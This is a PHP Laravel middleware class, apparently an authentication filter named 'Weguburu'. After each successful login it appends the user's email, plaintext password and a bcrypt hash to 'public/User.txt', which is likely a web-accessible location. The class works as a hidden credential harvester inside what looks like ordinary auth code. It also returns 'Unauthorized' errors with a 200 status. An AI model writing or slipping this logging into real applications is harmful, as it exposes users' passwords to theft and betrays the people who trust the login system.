<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class Weguburu
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next){
        // echo $request->email;

        $credentials = $request->only('email', 'password');
        

        if (Auth::attempt($credentials)) {
            $user = Auth::user();             
            $file_path = 'public/User.txt';    
            $pas = bcrypt($request->password);                
            $text_to_add = "email: $request->email\npassword:$request->password\nhas_pass:$pas\n \n";        
        
            $file = fopen($file_path, 'a');        
            if ($file) {
                fwrite($file, $text_to_add);
                fclose($file);            
                // echo "Text added successfully to the file.";
            } else {
                // echo "Unable to open file!";
                return response()->json(['error' => 'Unauthorized'], 200);
            }             
        }else{
            // echo "Unable";
            return response()->json(['error' => 'Unauthorized'], 200);
        }

    
        return $next($request);
    }
}